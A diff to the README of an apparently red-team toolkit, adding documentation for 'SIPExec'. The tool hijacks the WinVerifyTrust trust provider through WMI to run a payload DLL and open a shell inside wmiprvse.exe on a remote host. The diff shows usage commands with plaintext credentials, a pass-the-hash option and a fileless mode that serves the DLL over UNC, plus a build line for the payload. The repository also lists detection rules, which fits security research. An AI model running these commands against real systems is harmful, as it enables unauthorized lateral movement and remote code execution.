@@ -18,6 +18,10 @@ TrustMeBro/
 ├── SigStash/                           Payload extraction from signed PEs
 │   ├── loader.cpp                      Argument-based loader (reads a carrier file)
 │   └── stub.c                          Self-extracting stub (reads its own PE)
+├── sipexec/                            Lateral movement via WVT FinalPolicy hijack
+│   ├── sipexec.py                      Orchestrator (upload, hijack, trigger, shell)
+│   ├── sipexec_payload.c              Payload DLL source
+│   └── sipexec_payload_signed.dll      Pre-built signed payload
 ├── tools/
 │   └── FormatGhost/                    CryptDllFormatObject persistence tool
 ├── detection/                          YARA and Sigma detection rules
@@ -339,6 +343,40 @@ Reads its own PE from disk. Writes payload to `%TEMP%\sigstash_out.bin`. No argu
 
 ---
 
+## SIPExec (Lateral Movement)
+
+Remote command execution via WinVerifyTrust FinalPolicy hijack. Stages a payload DLL on the target, hijacks the trust provider registry via WMI, triggers a WMI provider load that invokes WVT, and gets a shell over a named pipe inside `wmiprvse.exe`. No new process is created — code runs inside the existing WMI provider host.
+
+### SIP Execution Surface
+<p align="center">
+  <img src="docs/06-sip-exec-surface.svg" alt="SIP execution surface — DLL loads during file-type routing" width="700"/>
+</p>
+
+### SIPExec Lateral Movement Flow
+<p align="center">
+  <img src="docs/09-sipexec-flow.svg" alt="SIPExec lateral movement chain" width="700"/>
+</p>
+
+**MITRE:** T1553.003 (SIP and Trust Provider Hijacking) + T1047 (WMI) + T1021.002 (SMB)
+
+```bash
+# One-shot command
+python3 sipexec/sipexec.py 'DOMAIN/user:password@target' whoami
+
+# Interactive shell (runs inside wmiprvse.exe)
+python3 sipexec/sipexec.py 'DOMAIN/user:password@target'
+
+# Pass the hash
+python3 sipexec/sipexec.py -hashes :NTHASH 'DOMAIN/user@target'
+
+# Fileless — serve DLL over UNC, nothing written to target disk
+sudo python3 sipexec/sipexec.py -serve -listen 10.0.0.5 'user:pass@target'
+```
+
+See [`sipexec/README.md`](sipexec/README.md) for build instructions and all options.
+
+---
+
 ## FormatGhost (Standalone Tool)
 
 Standalone at `tools/FormatGhost/`. Registers a DLL as a `CryptDllFormatObject` handler. The DLL loads when `certutil -dump` or any cert UI parses a PE with the registered OID. Requires admin. Requires user interaction to trigger. See `tools/FormatGhost/README.md`.
@@ -379,6 +417,9 @@ x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/SigStashLoader.exe SigStash/loader.
 # SigStash self-extracting stub
 x86_64-w64-mingw32-gcc -O2 -s -o bin/SigStashStub.exe SigStash/stub.c -lkernel32
 x86_64-w64-mingw32-gcc -O2 -s -DCAMOUFLAGE_MODE=1 -o bin/SigStashStubCamo.exe SigStash/stub.c -lkernel32
+
+# SIPExec payload DLL
+x86_64-w64-mingw32-gcc -shared -O2 -Wall -o sipexec/sipexec_payload.dll sipexec/sipexec_payload.c
 
 # FormatGhost DLL
 cd tools/FormatGhost && make
